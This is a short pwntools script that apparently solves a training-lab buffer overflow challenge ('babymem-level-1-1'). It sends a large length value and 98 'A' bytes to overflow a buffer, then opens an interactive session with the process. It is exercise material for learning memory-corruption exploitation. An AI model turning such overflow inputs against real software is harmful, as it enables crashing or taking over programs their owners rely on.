from pwn import *

elf = ELF("/challenge/babymem-level-1-1")
p = elf.process()

p.sendline(b"5000")

p.sendline(b"A"*98)

p.interactive()
